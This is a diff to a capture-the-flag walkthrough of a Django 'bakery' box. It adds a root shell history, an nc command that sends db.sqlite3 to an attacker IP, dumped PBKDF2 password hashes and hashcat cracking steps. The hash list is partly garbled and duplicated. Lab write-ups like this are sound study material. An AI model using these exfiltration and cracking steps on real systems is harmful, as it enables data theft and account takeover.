@@ -81,7 +81,7 @@ if __name__ == '__main__':
     print(base64.urlsafe_b64encode(pickled))
 ```
 
-## Root
+## Root (container)
 
 Editing the code we can get RCE via the serilization. 
 
@@ -133,4 +133,116 @@ Now we can enumerate again to find more information.
 
 ## Enumeration 2
 
+In the /root folder in .bash_history we find some juicy data
 
+```
+nc
+exit
+ifconfig
+ip addr
+ssh 172.17.0.1
+ssh 172.17.0.2
+exit
+ssh ramsey@172.17.0.1
+exit
+cd /tmp
+wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
+chmod +x check-config.sh
+./check-config.sh 
+nano /etc/default/grub
+vi /etc/default/grub
+apt install vi
+apt update
+apt install vi
+apt install vim
+apt install nano
+nano /etc/default/grub
+grub-update
+apt install grub-update
+apt-get install --reinstall grub
+grub-update
+exit
+ssh ramsey@172.17.0.1
+exit
+ssh ramsey@172.17.0.1
+exit
+ls
+cd site/
+ls
+cd bakery/
+ls
+nano settings.py 
+exit
+ls
+cd site/
+ls
+cd bakery/
+nano settings.py 
+exit
+apt remove --purge ssh
+ssh
+apt remove --purge autoremove open-ssh*
+apt remove --purge autoremove openssh=*
+apt remove --purge autoremove openssh-*
+ssh
+apt autoremove openssh-client
+clear
+ssh
+ssh
+ssh
+exit
+```
+
+
+In /home/site we find an intresting file called db.sqlite3. Lets get it on our box and see what secrets it holds! 
+
+```
+# our box
+nc -lnvp 8082 > db.sqlite3 
+
+# attack box
+nc 10.8.153.120 8082 < db.sqlite3
+```
+
+Now lets go through the file. 
+
+```
+sqlite3 db.sqlite3
+
+SQLite version 3.36.0 2021-06-18 18:36:39
+Enter ".help" for usage hints.
+sqlite> .tables
+auth_group                  django_admin_log          
+auth_group_permissions      django_content_type       
+auth_permission             django_migrations         
+auth_user                   django_session            
+auth_user_groups            homepage_article          
+auth_user_user_permissions
+
+sqlite> select * from auth_user;
+
+1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|
+11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|testing|||0|1|2020-10-02 10:16:45.686339|
+12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|ramsey|||0|1|2020-10-02 14:42:44.388799|
+13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|oliver|||0|1|2020-10-02 14:42:59.113998|
+14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|wan|||0|1|2020-10-02 14:43:15.102863|
+```
+
+Now we can crack the hash's for these accounts. 
+
+```
+pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=:aniqfakhrul
+pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=:testing
+pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=:ramsey
+pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=:oliver
+pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=:wan:aniqfakhrul
+pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=:testing
+pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=:ramsey
+pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=:oliver
+pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=:wan
+```
+
+Cracking with hashcat
+```
+hashcat -a 0 -m 10000 hash /usr/share/wordlists/rockyou.txt -O  
+```
